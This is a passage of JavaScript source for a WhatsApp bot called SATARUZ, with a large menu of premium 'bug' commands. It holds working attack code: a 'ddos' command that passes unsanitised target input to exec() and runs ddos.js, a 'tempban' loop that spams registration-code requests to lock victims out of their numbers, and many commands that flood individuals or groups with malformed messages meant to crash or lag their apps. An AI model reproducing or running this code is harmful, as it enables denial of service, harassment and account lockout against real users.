  await temporary(Yosh, m, kodenegara, nomortarget, from)
  }
  break
  case 'ddos': case 'mix':{
    if (!isCreator) return YoshStickOwner()
    if (!q.includes(' ')) return replygcYosh(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
         const targetweb = q.substring(0, q.indexOf(' ') - 0)
    const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
 replygcYosh(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
  exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
if (error) {
replygcYosh(`Error: ${error.message}`);
return;
}
if (stderr) {
replygcYosh(`Error: ${stderr}`);
return;
}
replygcYosh(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
});  
             }
    break
case '17': case 'tempban': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example: ${prefix + command} 91|6909137211`)
if (!/|/.test(text)) return replygcYosh(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
let numbers = JSON.parse(fs.readFileSync('./database/tempban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await replygcYosh(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state, saveCreds } = await useMultiFileAuthState('session')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tempban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
case '24': case 'iosq':{
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Yosh.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": Yoshtext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case '22': case 'iosgoogle': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Yosh.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: Yoshtext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case '23': case 'iosgoogle2': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
Yosh.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: Yoshtext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcYosh(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case '20': case 'xioscrash':
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Yosh.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case '21': case 'xioscrash2':{
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
Yosh.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcYosh(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case '18': case 'xcrash':{
if (!isPremium) return replygcYosh(mess.prem)
 if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
YoshyCrashy(pushname,victim)
await sleep(3000)
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case '19': case 'xcrash2':
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
YoshyCrashy(pushname,m.chat)
await sleep(3000)
}
replygcYosh(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case '25': case 'amountbug': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const Yoshybug1 = `${Yoshtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcYosh(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case '26':case 'pmbug' :{
 if (!isPremium) return replygcYosh(mess.prem)
 if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 62815540932401`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = `${Yoshtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case '27':case 'delaybug' : {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 62815540932401`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = Yoshtext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcYosh(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case '28':case 'docubug': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 62815540932401`)
await loading()
if (args.length < 1) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 62815540932401`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = `${Yoshtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case '29':case 'unlimitedbug' : {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 62815540932401`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = Yoshtext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case '30':case 'bombug': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 62815540932401`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = Yoshtext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case '31':case 'lagbug' : {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 62815540932401`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = Yoshtext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case '32':case 'trollybug': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} 62815540932401`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "62815540932401@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Yosh.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcYosh(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case '33':case 'gcbug' : {
if (!isPremium) return replygcYosh(mess.prem)
 if (!args[0]) return replygcYosh(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Yoshgc = await Yosh.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = `${Yoshtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(Yoshgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcYosh(`*Successfully sent Bug To ${Yoshgc} Please pause for 3 minutes*`)
}
break
case '34':case 'delaygcbug' :  {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Yoshgc = await Yosh.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = Yoshtext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(Yoshgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcYosh(`*Successfully sent Bug To ${Yoshgc} Please pause for 3 minutes*`)
}
break
case '35':case 'laggcbug' :  {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Yoshgc = await Yosh.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = Yoshtext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(Yoshgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcYosh(`*Successfully sent Bug To ${Yoshgc} Please pause for 3 minutes*`)
}
break
case '36':case 'bomgcbug' :  {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Yoshgc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = Yoshtext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(Yoshgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcYosh(`*Successfully sent Bug To ${Yoshgc} Please pause for 3 minutes*`)
}
break
case '37':case 'unlimitedgcbug' :  {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Yoshgc = await Yosh.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = Yoshtext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(Yoshgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcYosh(`*Successfully sent Bug To ${Yoshgc} Please pause for 3 minutes*`)
}
break
case '38':case 'trollygcbug' :  {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Yoshgc = await Yosh.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "62815540932401@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Yosh.relayMessage(Yoshgc, order.message, { messageId: order.key.id })
}
replygcYosh(`*Successfully sent Bug To ${Yoshgc} Please pause for 3 minutes*`)
}
break
case '39':case 'docugcbug' :  {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Yoshgc = await Yosh.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const Yoshybug1 = `${Yoshtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Yoshybug1,
}
}), { userJid: from, quoted : m})
Yosh.relayMessage(Yoshgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcYosh(`*Successfully sent Bug To ${Yoshgc} Please pause for 3 minutes*`)
} 
break
            case 'allmenu':
            case 'help':
            case 'alive':
            case '?':
				const mediat = await prepareWAMessageMedia({
                    'image': await fetch('https://telegra.ph/file/774da4feffdc5af3decda.png')
                  }, {
                    'upload': Yosh.waUploadToServer
                  });
        let msgtt = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'contextInfo': {
                  'mentionedJid': null,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': "0@newsletter",
                    'newsletterName': "Powered By 🦄 SATARUZ",
                    'serverMessageId': -1
                  },
                  'businessMessageForwardInfo': {
                    'businessOwnerJid': "0@s.whatsapp.net"
                  },
                  'externalAdReply': {
                    'title': "🦄 SATARUZ",
                    'thumbnailUrl': 'https://telegra.ph/file/40da4c69c82e244a72500.jpg',
                    'sourceUrl': '',
                    'mediaType': 1,
                    'renderLargerThumbnail': true
                  }
                },
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}
➤ ${Yoshytimewisher}
${readmore}
➤ BUG MENU
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
✞ • xreact <reply chat>
✞ • x <number|amount>
✞ • x2 <amount>
✞ • iosbug <number|amount>
✞ • iosbug2 <amount>
✞ • xaudio <number|amount>
✞ • xaudio2 <amount>
✞ • xsticker <number|amount>
✞ • xsticker2 <amount>
✞ • xloc <number|amount>
✞ • xloc2 <amount>
✞ • xlist <number|amount>
✞ • xlist2 <amount>
✞ • xkill <number|amount>
✞ • xkill2 <amount>
✞ • xkillgc <link group>
✞ • tempban <code|number>
✞ • xcrash <number>
✞ • xcrash2 <amount>
✞ • xioscrash <number>
✞ • xioscrash2 <amount>
✞ • iosgoogle <number>
✞ • iosgoogle2 <amount>
✞ • iosq <number>
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
➤ OWNER MENU
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
✞ • getsession
✞ • deletesession
✞ • join
✞ • shutdown  
✞ • restart
✞ • autoread *[option]*
✞ • autotyping *[option]*
✞ • autorecording *[option]*
✞ • autorecordtyp *[option]*
✞ • autobio *[option]*
✞ • autoswview *[option]*
✞ • mode *[option]*
✞ • block
✞ • unblock 
✞ • backup
✞ • getcase
✞ • addowner
✞ • delowner
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
➤ GC MENU
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
✞ • closetime
✞ • opentime
✞ • kick
✞ • add
✞ • promote
✞ • demote
✞ • setdesc
✞ • setppgc
✞ • tagall
✞ • hidetag
✞ • totag
✞ • group *[option]*
✞ • editinfo
✞ • linkgc
✞ • revoke
✞ • listonline
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
➤ MAIN MENU
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
✞ • menu
✞ • buypremium
✞ • runtime
✞ • script
✞ • donate
✞ • owner
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
➤ CONVERT MENU
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
✞ • sticker
✞ • smeme
✞ • take
✞ • toimage
✞ • tovideo
✞ • toaudio
✞ • tomp3
✞ • tovn
✞ • togif
✞ • tourl
✞ • toqr
✞ • toviewonce
✞ • fliptext
✞ • emojimix
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
➤ DATABASE MENU
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
✞ • addvideo
✞ • addimage
✞ • addsticker
✞ • addvn
✞ • addzip
✞ • addapk
✞ • addpdf
✞ • delvideo
✞ • delimage
✞ • delsticker
✞ • delvn
✞ • delzip
✞ • delapk
✞ • delpdf
✞ • listvideo
✞ • listimage
✞ • liststicker
✞ • listvn
✞ • listzip
✞ • listapk
✞ • listpdf
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
➤ DOWN MENU
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜
✞ • play
✞ • ytmp3
✞ • ytmp4
✞ • hd
✞ • tiktok
✞ • tiktokslide
✞ • sound1 - sound161
𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> DASHBOARD </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"↪ BACK\",\"id\":\".menu\"}"
                  }]
                })
              })
            },
            'contextInfo': {
              'forwardingScore': 289,
              'isForwarded': true,
              'mentionedJid': null,
              'businessMessageForwardInfo': {
                'businessOwnerJid': "6288980818668@s.whatsapp.net"
              },
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363192485906802@newsletter",
                'serverMessageId': 1,
                'newsletterName': "🦄 SATARUZ "
              }
            }
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, msgtt.message, {});
                break
                case 'textban':
        let msgtyy = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'contextInfo': {
                  'mentionedJid': null,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': "0@newsletter",
                    'newsletterName': "Powered By 🦄 SATARUZ",
                    'serverMessageId': -1
                  },
                  'businessMessageForwardInfo': {
                    'businessOwnerJid': "0@s.whatsapp.net"
                  },
                  'externalAdReply': {
                    'title': "🦄 SATARUZ",
                    'thumbnailUrl': 'https://telegra.ph/file/40da4c69c82e244a72500.jpg',
                    'sourceUrl': '',
                    'mediaType': 1,
                    'renderLargerThumbnail': true
                  }
                },
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}
Maaf Kalau text ya Pasaran atau blm Update`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> DASHBOARD </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【1】\",\"id\":\".textb1\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【1】\",\"id\":\".textb2\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【2】\",\"id\":\".textb3\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【3】\",\"id\":\".textb4\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【4】\",\"id\":\".textb5\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【5】\",\"id\":\".textb6\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【6】\",\"id\":\".textb6\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【7】\",\"id\":\".tetxb7\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【8】\",\"id\":\".textb8\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Ban【9】\",\"id\":\".textb9\"}"
                  }]
                })
              })
            },
            'contextInfo': {
              'forwardingScore': 289,
              'isForwarded': true,
              'mentionedJid': null,
              'businessMessageForwardInfo': {
                'businessOwnerJid': "6288980818668@s.whatsapp.net"
              },
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363192485906802@newsletter",
                'serverMessageId': 1,
                'newsletterName': "🦄 SATARUZ "
              }
            }
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, msgtyy.message, {});
                break
            case 'textunban':
        let msgty = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'contextInfo': {
                  'mentionedJid': null,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': "0@newsletter",
                    'newsletterName': "Powered By 🦄 SATARUZ",
                    'serverMessageId': -1
                  },
                  'businessMessageForwardInfo': {
                    'businessOwnerJid': "0@s.whatsapp.net"
                  },
                  'externalAdReply': {
                    'title': "🦄 SATARUZ",
                    'thumbnailUrl': 'https://telegra.ph/file/40da4c69c82e244a72500.jpg',
                    'sourceUrl': '',
                    'mediaType': 1,
                    'renderLargerThumbnail': true
                  }
                },
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}
Maaf Kalau text ya Pasaran atau blm Update`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> DASHBOARD </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "quick_reply",
